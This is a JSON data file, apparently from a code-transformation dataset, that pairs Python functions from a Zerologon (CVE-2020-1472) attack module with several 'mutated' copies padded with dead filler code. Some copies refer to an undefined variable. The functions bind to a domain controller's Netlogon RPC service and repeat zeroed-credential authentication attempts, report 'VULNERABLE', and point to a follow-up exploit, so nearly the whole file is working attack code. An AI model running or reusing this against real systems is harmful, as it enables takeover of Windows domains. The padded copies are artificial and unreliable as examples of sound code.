[
    {
        "func_name": "__init__",
        "original": "def __init__(self, context=None, module_options=None):\n    self.context = context\n    self.module_options = module_options",
        "mutated": [
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n    self.context = context\n    self.module_options = module_options",
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.context = context\n    self.module_options = module_options",
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.context = context\n    self.module_options = module_options",
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.context = context\n    self.module_options = module_options",
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.context = context\n    self.module_options = module_options"
        ]
    },
    {
        "func_name": "options",
        "original": "def options(self, context, module_options):\n    \"\"\"\"\"\"",
        "mutated": [
            "def options(self, context, module_options):\n    if False:\n        i = 10\n    ''",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    ''",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    ''",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    ''",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    ''"
        ]
    },
    {
        "func_name": "on_login",
        "original": "def on_login(self, context, connection):\n    self.context = context\n    if self.perform_attack('\\\\\\\\' + connection.hostname, connection.host, connection.hostname):\n        self.context.log.highlight('VULNERABLE')\n        self.context.log.highlight('Next step: https://github.com/dirkjanm/CVE-2020-1472')\n        try:\n            host = self.context.db.get_hosts(connection.host)[0]\n            self.context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)\n        except Exception as e:\n            self.context.log.debug(f'Error updating zerologon status in database')",
        "mutated": [
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n    self.context = context\n    if self.perform_attack('\\\\\\\\' + connection.hostname, connection.host, connection.hostname):\n        self.context.log.highlight('VULNERABLE')\n        self.context.log.highlight('Next step: https://github.com/dirkjanm/CVE-2020-1472')\n        try:\n            host = self.context.db.get_hosts(connection.host)[0]\n            self.context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)\n        except Exception as e:\n            self.context.log.debug(f'Error updating zerologon status in database')",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.context = context\n    if self.perform_attack('\\\\\\\\' + connection.hostname, connection.host, connection.hostname):\n        self.context.log.highlight('VULNERABLE')\n        self.context.log.highlight('Next step: https://github.com/dirkjanm/CVE-2020-1472')\n        try:\n            host = self.context.db.get_hosts(connection.host)[0]\n            self.context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)\n        except Exception as e:\n            self.context.log.debug(f'Error updating zerologon status in database')",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.context = context\n    if self.perform_attack('\\\\\\\\' + connection.hostname, connection.host, connection.hostname):\n        self.context.log.highlight('VULNERABLE')\n        self.context.log.highlight('Next step: https://github.com/dirkjanm/CVE-2020-1472')\n        try:\n            host = self.context.db.get_hosts(connection.host)[0]\n            self.context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)\n        except Exception as e:\n            self.context.log.debug(f'Error updating zerologon status in database')",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.context = context\n    if self.perform_attack('\\\\\\\\' + connection.hostname, connection.host, connection.hostname):\n        self.context.log.highlight('VULNERABLE')\n        self.context.log.highlight('Next step: https://github.com/dirkjanm/CVE-2020-1472')\n        try:\n            host = self.context.db.get_hosts(connection.host)[0]\n            self.context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)\n        except Exception as e:\n            self.context.log.debug(f'Error updating zerologon status in database')",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.context = context\n    if self.perform_attack('\\\\\\\\' + connection.hostname, connection.host, connection.hostname):\n        self.context.log.highlight('VULNERABLE')\n        self.context.log.highlight('Next step: https://github.com/dirkjanm/CVE-2020-1472')\n        try:\n            host = self.context.db.get_hosts(connection.host)[0]\n            self.context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)\n        except Exception as e:\n            self.context.log.debug(f'Error updating zerologon status in database')"
        ]
    },
    {
        "func_name": "perform_attack",
        "original": "def perform_attack(self, dc_handle, dc_ip, target_computer):\n    self.context.log.debug('Performing authentication attempts...')\n    rpc_con = None\n    try:\n        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')\n        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()\n        rpc_con.connect()\n        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)\n        for attempt in range(0, MAX_ATTEMPTS):\n            result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)\n            if result:\n                return True\n        else:\n            self.context.log.highlight('Attack failed. Target is probably patched.')\n    except DCERPCException as e:\n        self.context.log.fail(f'Error while connecting to host: DCERPCException, which means this is probably not a DC!')",
        "mutated": [
            "def perform_attack(self, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n    self.context.log.debug('Performing authentication attempts...')\n    rpc_con = None\n    try:\n        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')\n        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()\n        rpc_con.connect()\n        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)\n        for attempt in range(0, MAX_ATTEMPTS):\n            result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)\n            if result:\n                return True\n        else:\n            self.context.log.highlight('Attack failed. Target is probably patched.')\n    except DCERPCException as e:\n        self.context.log.fail(f'Error while connecting to host: DCERPCException, which means this is probably not a DC!')",
            "def perform_attack(self, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.context.log.debug('Performing authentication attempts...')\n    rpc_con = None\n    try:\n        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')\n        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()\n        rpc_con.connect()\n        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)\n        for attempt in range(0, MAX_ATTEMPTS):\n            result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)\n            if result:\n                return True\n        else:\n            self.context.log.highlight('Attack failed. Target is probably patched.')\n    except DCERPCException as e:\n        self.context.log.fail(f'Error while connecting to host: DCERPCException, which means this is probably not a DC!')",
            "def perform_attack(self, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.context.log.debug('Performing authentication attempts...')\n    rpc_con = None\n    try:\n        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')\n        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()\n        rpc_con.connect()\n        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)\n        for attempt in range(0, MAX_ATTEMPTS):\n            result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)\n            if result:\n                return True\n        else:\n            self.context.log.highlight('Attack failed. Target is probably patched.')\n    except DCERPCException as e:\n        self.context.log.fail(f'Error while connecting to host: DCERPCException, which means this is probably not a DC!')",
            "def perform_attack(self, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.context.log.debug('Performing authentication attempts...')\n    rpc_con = None\n    try:\n        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')\n        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()\n        rpc_con.connect()\n        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)\n        for attempt in range(0, MAX_ATTEMPTS):\n            result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)\n            if result:\n                return True\n        else:\n            self.context.log.highlight('Attack failed. Target is probably patched.')\n    except DCERPCException as e:\n        self.context.log.fail(f'Error while connecting to host: DCERPCException, which means this is probably not a DC!')",
            "def perform_attack(self, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.context.log.debug('Performing authentication attempts...')\n    rpc_con = None\n    try:\n        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')\n        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()\n        rpc_con.connect()\n        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)\n        for attempt in range(0, MAX_ATTEMPTS):\n            result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)\n            if result:\n                return True\n        else:\n            self.context.log.highlight('Attack failed. Target is probably patched.')\n    except DCERPCException as e:\n        self.context.log.fail(f'Error while connecting to host: DCERPCException, which means this is probably not a DC!')"
        ]
    },
    {
        "func_name": "fail",
        "original": "def fail(msg):\n    cme_logger.debug(msg)\n    cme_logger.fail('This might have been caused by invalid arguments or network issues.')\n    sys.exit(2)",
        "mutated": [
            "def fail(msg):\n    if False:\n        i = 10\n    cme_logger.debug(msg)\n    cme_logger.fail('This might have been caused by invalid arguments or network issues.')\n    sys.exit(2)",
            "def fail(msg):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    cme_logger.debug(msg)\n    cme_logger.fail('This might have been caused by invalid arguments or network issues.')\n    sys.exit(2)",
            "def fail(msg):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    cme_logger.debug(msg)\n    cme_logger.fail('This might have been caused by invalid arguments or network issues.')\n    sys.exit(2)",
            "def fail(msg):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    cme_logger.debug(msg)\n    cme_logger.fail('This might have been caused by invalid arguments or network issues.')\n    sys.exit(2)",
            "def fail(msg):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    cme_logger.debug(msg)\n    cme_logger.fail('This might have been caused by invalid arguments or network issues.')\n    sys.exit(2)"
        ]
    },
    {
        "func_name": "try_zero_authenticate",
        "original": "def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):\n    plaintext = b'\\x00' * 8\n    ciphertext = b'\\x00' * 8\n    flags = 556793855\n    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\\x00', target_computer + '\\x00', plaintext)\n    try:\n        server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\\x00', target_computer + '$\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + '\\x00', ciphertext, flags)\n        assert server_auth['ErrorCode'] == 0\n        return True\n    except nrpc.DCERPCSessionError as ex:\n        if ex.get_error_code() == 3221225506:\n            return None\n        else:\n            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')\n    except BaseException as ex:\n        fail(f'Unexpected error: {ex}.')",
        "mutated": [
            "def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n    plaintext = b'\\x00' * 8\n    ciphertext = b'\\x00' * 8\n    flags = 556793855\n    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\\x00', target_computer + '\\x00', plaintext)\n    try:\n        server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\\x00', target_computer + '$\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + '\\x00', ciphertext, flags)\n        assert server_auth['ErrorCode'] == 0\n        return True\n    except nrpc.DCERPCSessionError as ex:\n        if ex.get_error_code() == 3221225506:\n            return None\n        else:\n            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')\n    except BaseException as ex:\n        fail(f'Unexpected error: {ex}.')",
            "def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    plaintext = b'\\x00' * 8\n    ciphertext = b'\\x00' * 8\n    flags = 556793855\n    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\\x00', target_computer + '\\x00', plaintext)\n    try:\n        server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\\x00', target_computer + '$\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + '\\x00', ciphertext, flags)\n        assert server_auth['ErrorCode'] == 0\n        return True\n    except nrpc.DCERPCSessionError as ex:\n        if ex.get_error_code() == 3221225506:\n            return None\n        else:\n            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')\n    except BaseException as ex:\n        fail(f'Unexpected error: {ex}.')",
            "def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    plaintext = b'\\x00' * 8\n    ciphertext = b'\\x00' * 8\n    flags = 556793855\n    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\\x00', target_computer + '\\x00', plaintext)\n    try:\n        server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\\x00', target_computer + '$\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + '\\x00', ciphertext, flags)\n        assert server_auth['ErrorCode'] == 0\n        return True\n    except nrpc.DCERPCSessionError as ex:\n        if ex.get_error_code() == 3221225506:\n            return None\n        else:\n            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')\n    except BaseException as ex:\n        fail(f'Unexpected error: {ex}.')",
            "def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    plaintext = b'\\x00' * 8\n    ciphertext = b'\\x00' * 8\n    flags = 556793855\n    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\\x00', target_computer + '\\x00', plaintext)\n    try:\n        server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\\x00', target_computer + '$\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + '\\x00', ciphertext, flags)\n        assert server_auth['ErrorCode'] == 0\n        return True\n    except nrpc.DCERPCSessionError as ex:\n        if ex.get_error_code() == 3221225506:\n            return None\n        else:\n            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')\n    except BaseException as ex:\n        fail(f'Unexpected error: {ex}.')",
            "def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    plaintext = b'\\x00' * 8\n    ciphertext = b'\\x00' * 8\n    flags = 556793855\n    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\\x00', target_computer + '\\x00', plaintext)\n    try:\n        server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\\x00', target_computer + '$\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + '\\x00', ciphertext, flags)\n        assert server_auth['ErrorCode'] == 0\n        return True\n    except nrpc.DCERPCSessionError as ex:\n        if ex.get_error_code() == 3221225506:\n            return None\n        else:\n            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')\n    except BaseException as ex:\n        fail(f'Unexpected error: {ex}.')"
        ]
    }
]